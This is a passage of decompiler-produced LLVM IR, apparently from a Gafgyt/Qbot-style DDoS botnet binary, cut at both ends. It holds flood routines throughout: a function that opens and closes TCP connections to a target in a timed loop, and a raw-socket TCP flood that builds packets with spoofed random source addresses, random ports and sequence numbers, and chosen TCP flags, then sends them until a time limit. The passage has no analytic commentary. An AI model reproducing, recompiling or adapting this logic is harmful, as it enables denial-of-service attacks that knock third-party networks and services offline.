  store i32 %v3_104f8, i32* @r4, align 4
  %v1_10500 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_1050c = call i32 @__GI_htonl(i32 %v1_10500)
  store i32 %v1_1050c, i32* %r2.global-to-local, align 4
  %v3_10514 = load i32, i32* %stack_var_0, align 4
  %v1_10518 = add i32 %v3_10514, 8
  %v1_1051c = load i32, i32* @sp, align 4
  %v2_1051c = inttoptr i32 %v1_1051c to i32*
  store i32 %v1_10518, i32* %v2_1051c, align 4
  %v0_10524 = load i32, i32* @r4, align 4
  %v4_1052c = inttoptr i32 %v3_104d0 to i8*
  %v5_1052c = call i32 @makeIPPacket(i8* %v4_1052c, i32 %v0_10524, i32 %v1_1050c, i32 17)
  %v3_10530 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_10530, 8
  %v3_10544 = urem i32 %fold, 65536
  %v1_1054c = call i32 @__GI_htons(i32 %v3_10544)
  %sext = mul i32 %v1_1054c, 65536
  %v1_10550 = sdiv i32 %sext, 65536
  store i32 %v1_10550, i32* %r2.global-to-local, align 4
  %v1_1055c = trunc i32 %v1_10550 to i16
  %v3_1055c = add i32 %v3_104d0, 24
  %v4_1055c = inttoptr i32 %v3_1055c to i16*
  store i16 %v1_1055c, i16* %v4_1055c, align 8
  %v0_10560 = call i32 @rand_cmwc()
  %v3_1056c = urem i32 %v0_10560, 65536
  store i32 %v3_1056c, i32* %r2.global-to-local, align 4
  %v1_10574 = trunc i32 %v0_10560 to i16
  store i16 %v1_10574, i16* %v5_104f4, align 4
  br i1 %v2_101cc, label %dec_label_pc_10584, label %dec_label_pc_1059c

dec_label_pc_10584:                               ; preds = %dec_label_pc_1049c
  %v0_10584 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10584 to i16
  br label %dec_label_pc_105b8

dec_label_pc_1059c:                               ; preds = %dec_label_pc_1049c
  %v3_105a4 = urem i32 %arg2, 65536
  %v1_105ac = call i32 @__GI_htons(i32 %v3_105a4)
  %extract.t79 = trunc i32 %v1_105ac to i16
  br label %dec_label_pc_105b8

dec_label_pc_105b8:                               ; preds = %dec_label_pc_10584, %dec_label_pc_1059c
  %v0_10584.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10584 ], [ %extract.t79, %dec_label_pc_1059c ]
  %v3_1069c.pre-phi = phi i32 [ 0, %dec_label_pc_10584 ], [ %v3_105a4, %dec_label_pc_1059c ]
  %v3_105c0 = add i32 %v3_104d0, 22
  %v4_105c0 = inttoptr i32 %v3_105c0 to i16*
  store i16 %v0_10584.sink.off0, i16* %v4_105c0, align 2
  store i32 %v1_104f0, i32* %r2.global-to-local, align 4
  %v3_105cc = add i32 %v3_104d0, 26
  %v4_105cc = inttoptr i32 %v3_105cc to i16*
  store i16 0, i16* %v4_105cc, align 2
  %v1_105d4 = add i32 %v3_104d0, 28
  %v3_105dc = load i32, i32* %stack_var_0, align 4
  %v2_105e0 = call i32 @makeRandomStr(i32 %v1_105d4, i32 %v3_105dc)
  store i32 %v3_104d0, i32* %r2.global-to-local, align 4
  %v1_105f0 = or i32 %v3_104d0, 2
  %v2_105f0 = inttoptr i32 %v1_105f0 to i16*
  %v3_105f0 = load i16, i16* %v2_105f0, align 2
  %v4_105f0 = zext i16 %v3_105f0 to i32
  %v2_105fc = inttoptr i32 %v3_104d0 to i16*
  %v3_105fc = call i32 @csum(i16* %v2_105fc, i32 %v4_105f0)
  %sext4 = mul i32 %v3_105fc, 65536
  %v1_10600 = sdiv i32 %sext4, 65536
  store i32 %v1_10600, i32* %r2.global-to-local, align 4
  %v1_1060c = trunc i32 %v1_10600 to i16
  %v3_1060c = add i32 %v3_104d0, 10
  %v4_1060c = inttoptr i32 %v3_1060c to i16*
  store i16 %v1_1060c, i16* %v4_1060c, align 2
  %v2_10614 = call i32 @__GI_time(i32* null)
  store i32 %v2_10614, i32* %r2.global-to-local, align 4
  %v2_10620 = add i32 %v2_10614, %arg3
  %v2_10634 = ptrtoint i32* %stack_var_-80 to i32
  %v3_106d0 = or i32 %v3_104d0, 4
  %v4_106d0 = inttoptr i32 %v3_106d0 to i16*
  %v2_106f0 = add i32 %v3_104d0, 12
  %v3_106f0 = inttoptr i32 %v2_106f0 to i32*
  br label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %dec_label_pc_10754, %dec_label_pc_10748, %dec_label_pc_105b8
  %stack_var_-108.0 = phi i32 [ 0, %dec_label_pc_105b8 ], [ 0, %dec_label_pc_10748 ], [ %v1_10758, %dec_label_pc_10754 ]
  store i32 %v3_104d0, i32* %r2.global-to-local, align 4
  %v1_10638 = load i32, i32* @sp, align 4
  %v2_10638 = inttoptr i32 %v1_10638 to i32*
  store i32 %v2_10634, i32* %v2_10638, align 4
  %v1_10640 = load i32, i32* @sp, align 4
  %v2_10640 = add i32 %v1_10640, 4
  %v3_10640 = inttoptr i32 %v2_10640 to i32*
  store i32 16, i32* %v3_10640, align 4
  %v0_10648 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_104a0, i32* %r2.global-to-local, align 4
  %v6_10654 = call i32 @__libc_sendto(i32 %v3_10398, i32 %v0_10648, i32 %v1_104a0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_10658 = call i32 @rand_cmwc()
  %v3_10664 = urem i32 %v0_10658, 65536
  store i32 %v3_10664, i32* %r2.global-to-local, align 4
  %v1_1066c = trunc i32 %v0_10658 to i16
  store i16 %v1_1066c, i16* %v5_104f4, align 4
  br i1 %v2_101cc, label %dec_label_pc_1067c, label %dec_label_pc_10694

dec_label_pc_1067c:                               ; preds = %dec_label_pc_10630
  %v0_1067c = call i32 @rand_cmwc()
  %extract.t80 = trunc i32 %v0_1067c to i16
  br label %dec_label_pc_106b0

dec_label_pc_10694:                               ; preds = %dec_label_pc_10630
  %v1_106a4 = call i32 @__GI_htons(i32 %v3_1069c.pre-phi)
  %extract.t81 = trunc i32 %v1_106a4 to i16
  br label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_1067c, %dec_label_pc_10694
  %v0_1067c.sink.off0 = phi i16 [ %extract.t80, %dec_label_pc_1067c ], [ %extract.t81, %dec_label_pc_10694 ]
  %v4_106b4 = sext i16 %v0_1067c.sink.off0 to i32
  store i32 %v4_106b4, i32* %r2.global-to-local, align 4
  store i16 %v0_1067c.sink.off0, i16* %v4_105c0, align 2
  %v0_106bc = call i32 @rand_cmwc()
  %v3_106c8 = urem i32 %v0_106bc, 65536
  store i32 %v3_106c8, i32* %r2.global-to-local, align 4
  %v1_106d0 = trunc i32 %v0_106bc to i16
  store i16 %v1_106d0, i16* %v4_106d0, align 4
  %v1_106d8 = call i32 @HackerScan2(i32 %storemerge10)
  %v1_106e4 = call i32 @__GI_htonl(i32 %v1_106d8)
  store i32 %v1_106e4, i32* %v3_106f0, align 4
  store i32 %v3_104d0, i32* %r2.global-to-local, align 4
  %v3_10700 = load i16, i16* %v2_105f0, align 2
  %v4_10700 = zext i16 %v3_10700 to i32
  %v3_1070c = call i32 @csum(i16* %v2_105fc, i32 %v4_10700)
  %v1_1071c = trunc i32 %v3_1070c to i16
  store i16 %v1_1071c, i16* %v4_1060c, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_10728 = icmp eq i32 %stack_var_-108.0, %arg6
  br i1 %v9_10728, label %dec_label_pc_10730, label %dec_label_pc_10754

dec_label_pc_10730:                               ; preds = %dec_label_pc_106b0
  %v2_10734 = call i32 @__GI_time(i32* null)
  store i32 %v2_10734, i32* %r2.global-to-local, align 4
  %v8_10744 = icmp sgt i32 %v2_10734, %v2_10620
  br i1 %v8_10744, label %dec_label_pc_10764, label %dec_label_pc_10748

dec_label_pc_10748:                               ; preds = %dec_label_pc_10730
  br label %dec_label_pc_10630

dec_label_pc_10754:                               ; preds = %dec_label_pc_106b0
  %v1_10758 = add i32 %stack_var_-108.0, 1
  store i32 %v1_10758, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10630

dec_label_pc_10764:                               ; preds = %dec_label_pc_10730, %dec_label_pc_103fc, %dec_label_pc_103b0
  %v1_1077026 = phi i32 [ %v3_1040c, %dec_label_pc_103fc ], [ %v3_103c0, %dec_label_pc_103b0 ], [ %v2_10734, %dec_label_pc_10730 ]
  br label %dec_label_pc_10768

dec_label_pc_10768:                               ; preds = %dec_label_pc_10350, %dec_label_pc_10208, %dec_label_pc_10290, %dec_label_pc_10278, %dec_label_pc_10764
  %v1_10770 = phi i32 [ %v3_10218, %dec_label_pc_10208 ], [ 0, %dec_label_pc_10290 ], [ %v3_10288, %dec_label_pc_10278 ], [ %v1_1077026, %dec_label_pc_10764 ], [ %v2_10354, %dec_label_pc_10350 ]
  ret i32 %v1_10770

; uselistorder directives
  uselistorder i32 %v1_10758, { 1, 0 }
  uselistorder i32 %v0_106bc, { 1, 0 }
  uselistorder i16 %v0_1067c.sink.off0, { 1, 0 }
  uselistorder i32 %v0_10658, { 1, 0 }
  uselistorder i32 %v1_10600, { 1, 0 }
  uselistorder i32 %v3_105a4, { 1, 0 }
  uselistorder i32 %v0_10560, { 1, 0 }
  uselistorder i32 %v1_10550, { 1, 0 }
  uselistorder i32 %v3_104d0, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_104a0, { 1, 0 }
  uselistorder i32 %v3_102f8, { 1, 0 }
  uselistorder i32 %stack_var_-112.0, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 26, { 1, 2, 0 }
  uselistorder i32 ()* @rand, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 49, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10768, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_106b0, { 1, 0 }
  uselistorder label %dec_label_pc_105b8, { 1, 0 }
  uselistorder label %dec_label_pc_1049c, { 1, 0 }
  uselistorder label %dec_label_pc_10420, { 1, 0 }
  uselistorder label %dec_label_pc_10350, { 1, 0 }
  uselistorder label %dec_label_pc_10208, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_107a0 = call i32 @__GI_time(i32* null)
  %v2_107ac = add i32 %v2_107a0, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_107bc = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_107d8 = urem i32 %arg2, 65536
  %v1_107e0 = call i32 @__GI_htons(i32 %v3_107d8)
  %v2_10808 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1082c

dec_label_pc_107f0:                               ; preds = %dec_label_pc_1082c
  %v3_107fc = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_10818 = call i32 @__libc_connect(i32 %v3_107fc, i32 %v2_10808, i32 16)
  %v1_10820 = call i32 @sleep(i32 1)
  %v1_10828 = call i32 @__GI___libc_close(i32 %v3_107fc)
  br label %dec_label_pc_1082c

dec_label_pc_1082c:                               ; preds = %entry, %dec_label_pc_107f0
  %v2_10830 = call i32 @__GI_time(i32* null)
  %v5_10840 = icmp slt i32 %v2_10830, %v2_107ac
  br i1 %v5_10840, label %dec_label_pc_107f0, label %dec_label_pc_10844

dec_label_pc_10844:                               ; preds = %dec_label_pc_1082c
  ret i32 %v2_10830

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1082c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 67676, i32* %stack_var_-4, align 4
  %v2_10858 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10858, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_1088c = icmp eq i32 %arg2, 0
  br i1 %v2_1088c, label %dec_label_pc_10894, label %dec_label_pc_108ac

dec_label_pc_10894:                               ; preds = %entry
  %v0_10894 = call i32 @rand_cmwc()
  br label %dec_label_pc_108c8

dec_label_pc_108ac:                               ; preds = %entry
  %v3_108b4 = urem i32 %arg2, 65536
  %v1_108bc = call i32 @__GI_htons(i32 %v3_108b4)
  br label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_10894, %dec_label_pc_108ac
  %v3_108d8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_108e0 = icmp eq i32 %v3_108d8, 0
  br i1 %v2_108e0, label %dec_label_pc_108ec, label %dec_label_pc_10f28

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108c8
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_10900 = bitcast i32* %stack_var_-60 to i8*
  %v4_10900 = call i32 @__GI_memset(i8* %v3_10900, i32 0, i32 8)
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_10910 = call i32 @socket(i32 2, i32 3, i32 6)
  %v2_10920 = icmp eq i32 %v3_10910, 0
  br i1 %v2_10920, label %dec_label_pc_10928, label %dec_label_pc_10940

dec_label_pc_10928:                               ; preds = %dec_label_pc_108ec
  %v2_1092c = load i32, i32* @global_var_324c8.59, align 4
  %v3_10938 = call i32 @HackerPrint(i32 %v2_1092c, i32 ptrtoint ([27 x i8]* @global_var_27f50.1186 to i32))
  br label %dec_label_pc_10f28

dec_label_pc_10940:                               ; preds = %dec_label_pc_108ec
  store i32 1, i32* %stack_var_-72, align 4
  %v2_10948 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_10964 = call i32 @__GI_setsockopt(i32 %v3_10910, i32 0, i32 3, i32 %v2_10948, i32 4)
  %v1_1096c = icmp slt i32 %v5_10964, 0
  br i1 %v1_1096c, label %dec_label_pc_10974, label %dec_label_pc_1098c

dec_label_pc_10974:                               ; preds = %dec_label_pc_10940
  %v2_10978 = load i32, i32* @global_var_324c8.59, align 4
  %v3_10984 = call i32 @HackerPrint(i32 %v2_10978, i32 ptrtoint ([33 x i8]* @global_var_27f6c.1188 to i32))
  br label %dec_label_pc_10f28

dec_label_pc_1098c:                               ; preds = %dec_label_pc_10940
  %v2_10990 = icmp eq i32 %arg4, 0
  br i1 %v2_10990, label %dec_label_pc_109bc, label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_1098c
  %v1_109a8 = sub i32 32, %arg4
  store i32 %v1_109a8, i32* %r2.global-to-local, align 4
  %v1_109b4 = shl i32 -1, %v1_109a8
  br label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %dec_label_pc_1098c, %dec_label_pc_109a4
  %storemerge9 = phi i32 [ %v1_109b4, %dec_label_pc_109a4 ], [ 0, %dec_label_pc_1098c ]
  %v1_109c0 = add i32 %arg6, 40
  %v1_109d0 = add i32 %arg6, 54
  %v3_109d4 = and i32 %v1_109d0, -8
  %v1_109dc = load i32, i32* @sp, align 4
  %v2_109dc = sub i32 %v1_109dc, %v3_109d4
  %v1_109ec = add i32 %v2_109dc, 15
  %v3_109f0 = and i32 %v1_109ec, -8
  store i32 %v3_109f0, i32* %r2.global-to-local, align 4
  %v1_10a10 = add i32 %v3_109f0, 20
  %v5_10a14 = inttoptr i32 %v1_10a10 to i16*
  %v3_10a18 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_10a18, i32* @r4, align 4
  %v1_10a20 = call i32 @HackerScan2(i32 %storemerge9)
  %v1_10a2c = call i32 @__GI_htonl(i32 %v1_10a20)
  store i32 %v1_10a2c, i32* %r2.global-to-local, align 4
  %v1_10a38 = add i32 %arg6, 20
  %v1_10a3c = load i32, i32* @sp, align 4
  %v2_10a3c = inttoptr i32 %v1_10a3c to i32*
  store i32 %v1_10a38, i32* %v2_10a3c, align 4
  %v0_10a44 = load i32, i32* @r4, align 4
  %v4_10a4c = inttoptr i32 %v3_109f0 to i8*
  %v5_10a4c = call i32 @makeIPPacket(i8* %v4_10a4c, i32 %v0_10a44, i32 %v1_10a2c, i32 6)
  %v0_10a50 = call i32 @rand_cmwc()
  %v3_10a5c = urem i32 %v0_10a50, 65536
  store i32 %v3_10a5c, i32* %r2.global-to-local, align 4
  %v1_10a64 = trunc i32 %v0_10a50 to i16
  store i16 %v1_10a64, i16* %v5_10a14, align 4
  %v0_10a68 = call i32 @rand_cmwc()
  %v2_10a74 = add i32 %v3_109f0, 24
  %v3_10a74 = inttoptr i32 %v2_10a74 to i32*
  store i32 %v0_10a68, i32* %v3_10a74, align 8
  %v2_10a80 = add i32 %v3_109f0, 28
  %v3_10a80 = inttoptr i32 %v2_10a80 to i32*
  store i32 0, i32* %v3_10a80, align 4
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v1_10a88 = add i32 %v3_109f0, 32
  %v2_10a88 = inttoptr i32 %v1_10a88 to i8*
  %v3_10a88 = load i8, i8* %v2_10a88, align 8
  %v1_10a94 = urem i8 %v3_10a88, 16
  %v1_10a98 = or i8 %v1_10a94, 80
  store i8 %v1_10a98, i8* %v2_10a88, align 8
  %v3_10aa8 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_27f90.1193 to i32), i32* @r1, align 4
  %v3_10ab4 = inttoptr i32 %v3_10aa8 to i8*
  %v4_10ab4 = call i32 @__GI_strcoll(i8* %v3_10ab4, i32 ptrtoint ([4 x i8]* @global_var_27f90.1193 to i32))
  %v2_10abc = icmp eq i32 %v4_10ab4, 0
  br i1 %v2_10abc, label %dec_label_pc_10ac4, label %dec_label_pc_10b7c

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_109bc
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v1_10ac8 = add i32 %v3_109f0, 33
  %v2_10ac8 = inttoptr i32 %v1_10ac8 to i8*
  %v3_10ac8 = load i8, i8* %v2_10ac8, align 1
  %v1_10ad8 = or i8 %v3_10ac8, 2
  store i8 %v1_10ad8, i8* %v2_10ac8, align 1
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v3_10aec = load i8, i8* %v2_10ac8, align 1
  %v1_10afc = or i8 %v3_10aec, 4
  store i8 %v1_10afc, i8* %v2_10ac8, align 1
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v3_10b10 = load i8, i8* %v2_10ac8, align 1
  %v1_10b20 = or i8 %v3_10b10, 1
  store i8 %v1_10b20, i8* %v2_10ac8, align 1
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v3_10b34 = load i8, i8* %v2_10ac8, align 1
  %v1_10b44 = or i8 %v3_10b34, 16
  store i8 %v1_10b44, i8* %v2_10ac8, align 1
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v3_10b58 = load i8, i8* %v2_10ac8, align 1
  %v1_10b68 = or i8 %v3_10b58, 8
  store i8 %v1_10b68, i8* %v2_10ac8, align 1
  br label %dec_label_pc_10d24

dec_label_pc_10b7c:                               ; preds = %dec_label_pc_109bc
  %v3_10b7c = load i32, i32* %stack_var_0, align 4
  %v2_10b88 = call i32 @__GI_strtok(i32 %v3_10b7c, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_10d1c18 = icmp eq i32 %v2_10b88, 0
  br i1 %v2_10d1c18, label %dec_label_pc_10d24, label %dec_label_pc_10b98.lr.ph

dec_label_pc_10b98.lr.ph:                         ; preds = %dec_label_pc_10b7c
  %v1_10bb8 = add i32 %v3_109f0, 33
  %v2_10bb8 = inttoptr i32 %v1_10bb8 to i8*
  br label %dec_label_pc_10b98

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b98.lr.ph, %dec_label_pc_10d04
  %storemerge1319 = phi i32 [ %v2_10b88, %dec_label_pc_10b98.lr.ph ], [ %v2_10d0c, %dec_label_pc_10d04 ]
  store i32 ptrtoint ([4 x i8]* @global_var_27f98.1197 to i32), i32* @r1, align 4
  %v3_10ba4 = inttoptr i32 %storemerge1319 to i8*
  %v4_10ba4 = call i32 @__GI_strcoll(i8* %v3_10ba4, i32 ptrtoint ([4 x i8]* @global_var_27f98.1197 to i32))
  %v2_10bac = icmp eq i32 %v4_10ba4, 0
  br i1 %v2_10bac, label %dec_label_pc_10bb4, label %dec_label_pc_10bdc

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b98
  %v3_10bb8 = load i8, i8* %v2_10bb8, align 1
  %v4_10bc0 = zext i8 %v3_10bb8 to i32
  %v1_10bc8 = or i32 %v4_10bc0, 2
  store i32 %v1_10bc8, i32* %r2.global-to-local, align 4
  %v1_10bd4 = trunc i32 %v1_10bc8 to i8
  store i8 %v1_10bd4, i8* %v2_10bb8, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10bdc:                               ; preds = %dec_label_pc_10b98
  store i32 ptrtoint ([4 x i8]* @global_var_27f9c.1199 to i32), i32* @r1, align 4
  %v4_10be8 = call i32 @__GI_strcoll(i8* %v3_10ba4, i32 ptrtoint ([4 x i8]* @global_var_27f9c.1199 to i32))
  %v2_10bf0 = icmp eq i32 %v4_10be8, 0
  br i1 %v2_10bf0, label %dec_label_pc_10bf8, label %dec_label_pc_10c20

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10bdc
  %v3_10bfc = load i8, i8* %v2_10bb8, align 1
  %v4_10c04 = zext i8 %v3_10bfc to i32
  %v1_10c0c = or i32 %v4_10c04, 4
  store i32 %v1_10c0c, i32* %r2.global-to-local, align 4
  %v1_10c18 = trunc i32 %v1_10c0c to i8
  store i8 %v1_10c18, i8* %v2_10bb8, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10c20:                               ; preds = %dec_label_pc_10bdc
  store i32 ptrtoint ([4 x i8]* @global_var_27fa0.1201 to i32), i32* @r1, align 4
  %v4_10c2c = call i32 @__GI_strcoll(i8* %v3_10ba4, i32 ptrtoint ([4 x i8]* @global_var_27fa0.1201 to i32))
  %v2_10c34 = icmp eq i32 %v4_10c2c, 0
  br i1 %v2_10c34, label %dec_label_pc_10c3c, label %dec_label_pc_10c64

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10c20
  %v3_10c40 = load i8, i8* %v2_10bb8, align 1
  %v4_10c48 = zext i8 %v3_10c40 to i32
  %v1_10c50 = or i32 %v4_10c48, 1
  store i32 %v1_10c50, i32* %r2.global-to-local, align 4
  %v1_10c5c = trunc i32 %v1_10c50 to i8
  store i8 %v1_10c5c, i8* %v2_10bb8, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c20
  store i32 ptrtoint ([4 x i8]* @global_var_27fa4.1203 to i32), i32* @r1, align 4
  %v4_10c70 = call i32 @__GI_strcoll(i8* %v3_10ba4, i32 ptrtoint ([4 x i8]* @global_var_27fa4.1203 to i32))
  %v2_10c78 = icmp eq i32 %v4_10c70, 0
  br i1 %v2_10c78, label %dec_label_pc_10c80, label %dec_label_pc_10ca8

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c64
  %v3_10c84 = load i8, i8* %v2_10bb8, align 1
  %v4_10c8c = zext i8 %v3_10c84 to i32
  %v1_10c94 = or i32 %v4_10c8c, 16
  store i32 %v1_10c94, i32* %r2.global-to-local, align 4
  %v1_10ca0 = trunc i32 %v1_10c94 to i8
  store i8 %v1_10ca0, i8* %v2_10bb8, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10c64
  store i32 ptrtoint ([4 x i8]* @global_var_27fa8.1205 to i32), i32* @r1, align 4
  %v4_10cb4 = call i32 @__GI_strcoll(i8* %v3_10ba4, i32 ptrtoint ([4 x i8]* @global_var_27fa8.1205 to i32))
  %v2_10cbc = icmp eq i32 %v4_10cb4, 0
  br i1 %v2_10cbc, label %dec_label_pc_10cc4, label %dec_label_pc_10cec

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10ca8
  %v3_10cc8 = load i8, i8* %v2_10bb8, align 1
  %v4_10cd0 = zext i8 %v3_10cc8 to i32
  %v1_10cd8 = or i32 %v4_10cd0, 8
  store i32 %v1_10cd8, i32* %r2.global-to-local, align 4
  %v1_10ce4 = trunc i32 %v1_10cd8 to i8
  store i8 %v1_10ce4, i8* %v2_10bb8, align 1
  br label %dec_label_pc_10d04

dec_label_pc_10cec:                               ; preds = %dec_label_pc_10ca8
  %v2_10cf0 = load i32, i32* @global_var_324c8.59, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_10d00 = call i32 @HackerPrint(i32 %v2_10cf0, i32 ptrtoint ([18 x i8]* @global_var_27fac.1207 to i32))
  br label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %dec_label_pc_10cc4, %dec_label_pc_10c80, %dec_label_pc_10c3c, %dec_label_pc_10bf8, %dec_label_pc_10bb4, %dec_label_pc_10cec
  %v2_10d0c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_27f94.1195 to i32))
  %v2_10d1c = icmp eq i32 %v2_10d0c, 0
  br i1 %v2_10d1c, label %dec_label_pc_10d24, label %dec_label_pc_10b98

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10d04, %dec_label_pc_10b7c, %dec_label_pc_10ac4
  %v0_10d24 = call i32 @rand_cmwc()
  %v1_10d38 = trunc i32 %v0_10d24 to i16
  %v3_10d38 = add i32 %v3_109f0, 34
  %v4_10d38 = inttoptr i32 %v3_10d38 to i16*
  store i16 %v1_10d38, i16* %v4_10d38, align 2
  %v3_10d44 = add i32 %v3_109f0, 36
  %v4_10d44 = inttoptr i32 %v3_10d44 to i16*
  store i16 0, i16* %v4_10d44, align 4
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v3_10d50 = add i32 %v3_109f0, 38
  %v4_10d50 = inttoptr i32 %v3_10d50 to i16*
  store i16 0, i16* %v4_10d50, align 2
  br i1 %v2_1088c, label %dec_label_pc_10d60, label %dec_label_pc_10d78

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d24
  %v0_10d60 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_10d60 to i16
  br label %dec_label_pc_10d94

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d24
  %v3_10d80 = urem i32 %arg2, 65536
  %v1_10d88 = call i32 @__GI_htons(i32 %v3_10d80)
  %extract.t72 = trunc i32 %v1_10d88 to i16
  br label %dec_label_pc_10d94

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10d78
  %v0_10d60.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10d60 ], [ %extract.t72, %dec_label_pc_10d78 ]
  %v3_10d9c = add i32 %v3_109f0, 22
  %v4_10d9c = inttoptr i32 %v3_10d9c to i16*
  store i16 %v0_10d60.sink.off0, i16* %v4_10d9c, align 2
  %v2_10da8 = call i32 @tcpcsum(i32 %v3_109f0, i32 %v1_10a10)
  %v1_10db8 = trunc i32 %v2_10da8 to i16
  store i16 %v1_10db8, i16* %v4_10d44, align 4
  store i32 %v3_109f0, i32* %r2.global-to-local, align 4
  %v1_10dc8 = or i32 %v3_109f0, 2
  %v2_10dc8 = inttoptr i32 %v1_10dc8 to i16*
  %v3_10dc8 = load i16, i16* %v2_10dc8, align 2
  %v4_10dc8 = zext i16 %v3_10dc8 to i32
  %v2_10dd4 = inttoptr i32 %v3_109f0 to i16*
  %v3_10dd4 = call i32 @csum(i16* %v2_10dd4, i32 %v4_10dc8)
  %sext3 = mul i32 %v3_10dd4, 65536
  %v1_10dd8 = sdiv i32 %sext3, 65536
  store i32 %v1_10dd8, i32* %r2.global-to-local, align 4
  %v1_10de4 = trunc i32 %v1_10dd8 to i16
  %v3_10de4 = add i32 %v3_109f0, 10
  %v4_10de4 = inttoptr i32 %v3_10de4 to i16*
  store i16 %v1_10de4, i16* %v4_10de4, align 2
  %v2_10dec = call i32 @__GI_time(i32* null)
  %v2_10df8 = add i32 %v2_10dec, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10e0c = ptrtoint i32* %stack_var_-68 to i32
  %v2_10e4c = add i32 %v3_109f0, 12
  %v3_10e4c = inttoptr i32 %v2_10e4c to i32*
  %v3_10e64 = or i32 %v3_109f0, 4
  %v4_10e64 = inttoptr i32 %v3_10e64 to i16*
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10f18, %dec_label_pc_10f0c, %dec_label_pc_10d94
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_10d94 ], [ 0, %dec_label_pc_10f0c ], [ %v1_10f1c, %dec_label_pc_10f18 ]
  store i32 %v3_109f0, i32* %r2.global-to-local, align 4
